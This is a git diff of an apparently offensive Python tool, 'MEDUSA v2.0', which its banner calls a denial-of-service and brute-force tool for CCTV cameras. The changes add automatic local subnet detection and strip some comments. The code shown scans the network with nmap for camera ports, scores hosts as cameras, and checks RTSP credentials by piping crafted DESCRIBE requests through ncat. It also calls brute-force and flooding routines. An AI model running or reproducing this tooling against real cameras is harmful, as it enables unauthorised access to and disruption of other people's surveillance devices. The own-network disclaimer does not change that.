@@ -11,11 +11,27 @@ from rich.table import Table
 from rich.panel import Panel
 from rich.align import Align
 
-# Scroll-safe terminal config
 console = Console(force_terminal=True, soft_wrap=True)
 
-# --- CONFIGURATION ---
-TARGET_NETWORK = "192.168.1.0/24" 
+def get_local_network():
+    """Automatically detects the local network range."""
+    try:
+        # Grabs the default route to find the active subnet
+        route_output = subprocess.check_output("ip route | grep default", shell=True).decode()
+        interface = re.search(r'dev (\w+)', route_output).group(1)
+        
+        # Gets the specific CIDR range for that interface
+        addr_output = subprocess.check_output(f"ip -o -f inet addr show {interface}", shell=True).decode()
+        network = re.search(r'inet ([\d\.]+/\d+)', addr_output).group(1)
+        
+        # Converts specific IP to network address (e.g., 192.168.1.5/24 -> 192.168.1.0/24)
+        base_ip = network.split('/')[0].rsplit('.', 1)[0] + ".0/" + network.split('/')[1]
+        return base_ip
+    except:
+        return "192.168.1.0/24" # Fallback if detection fails
+
+# --- AUTO CONFIGURATION ---
+TARGET_NETWORK = get_local_network()
 CCTV_PORTS = "554,8089,34567,37777,9000,8000,1935,80,8080"
 CCTV_KEYWORDS = ["camera", "webcam", "ipcam", "cctv", "v380", "altobeam", "macro-video", "rtsp"]
 
@@ -26,7 +42,6 @@ def run_cmd(cmd):
         return ""
 
 def calculate_confidence(open_ports, banner_info):
-    """Logic skoring 100% berdasarkan banner dan port."""
     score = 0
     reasons = []
     if "554" in open_ports:
@@ -50,7 +65,6 @@ def calculate_confidence(open_ports, banner_info):
     return status, color, score, why
 
 def verify_rtsp_deep(ip, user, pw):
-    """Verifikasi autentikasi mendalam menggunakan handshaking manual."""
     auth_b64 = base64.b64encode(f"{user}:{pw}".encode()).decode()
     payload = f'DESCRIBE rtsp://{ip}/live/ch0 RTSP/1.0\\r\\nCSeq: 1\\r\\nAuthorization: Basic {auth_b64}\\r\\n\\r\\n'
     response = run_cmd(f'echo -e "{payload}" | ncat -w 3 {ip} 554')
@@ -80,7 +94,6 @@ def brute_force(ip):
         console.print(f"\n[red][-] Brute force finished. No valid credentials found.[/red]")
 
 def get_targets():
-    """Scanning menggunakan Nmap sV. Skor 0% tidak dimasukkan."""
     console.print(f"[bold cyan][*] Scanning {TARGET_NETWORK} for CCTV signatures...[/bold cyan]")
     cmd = f"sudo nmap -sV -Pn -p {CCTV_PORTS} --open {TARGET_NETWORK}"
     raw_output = run_cmd(cmd)
@@ -102,15 +115,8 @@ def get_targets():
                 banners.append(f"{p_num}:{b_info}")
         
         status, color, conf, why = calculate_confidence(open_ports, " ".join(banners))
-        
-        # FILTER: Hanya masukkan jika score > 0
         if conf > 0:
-            targets.append({
-                "ip": ip, 
-                "status": f"[{color}]{status}[/{color}] ({conf}%)", 
-                "vuln": "OPEN" if "8089" in open_ports else "CLOSED", 
-                "why": why
-            })
+            targets.append({"ip": ip, "status": f"[{color}]{status}[/{color}] ({conf}%)", "vuln": "OPEN" if "8089" in open_ports else "CLOSED", "why": why})
     return targets
 
 def release_serpents_dual(ips):
@@ -123,7 +129,6 @@ def release_serpents_dual(ips):
 
 def main():
     console.print("\n")
-    # Bigger Title Banner Logic
     title = Align.center("[bold magenta]M E D U S A   v 2. 0[/bold magenta]", vertical="middle")
     sub_title = "[white]Denial-of-Service & Brute Force Tool for CCTV[/white]"
     disclaimer = (
@@ -136,7 +141,6 @@ def main():
         "[bold green]TIP:[/bold green] [dim]Ensure you are testing on your OWN network and equipment.[/dim]"
     )
     
-    # Combined Panel for Big Title Effect
     console.print(Panel(title, border_style="magenta", padding=(1, 10)))
     console.print(Panel(f"{sub_title}\n\n{disclaimer}", border_style="blue", title="[bold white]Warning Notice[/bold white]"))
     
